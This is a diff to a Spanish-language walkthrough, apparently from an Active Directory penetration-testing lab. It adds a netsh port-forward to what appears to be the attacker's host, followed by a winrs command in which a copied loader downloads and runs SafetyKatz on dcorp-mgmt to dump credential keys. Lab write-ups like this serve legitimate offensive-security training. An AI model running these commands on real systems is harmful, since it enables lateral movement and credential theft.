@@ -603,7 +603,12 @@ Teniendo acceso de administrador local en esa maquina de dcorp-mgmt y sabemos qu
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 
-Haremos el renvió de puertos y ejecución de SafetyKatz
+Haremos el renvió de puertos
+```shell
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
+```
+
+Y ejecutaremos el SafetKatz
 ```shell
 winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
 ```
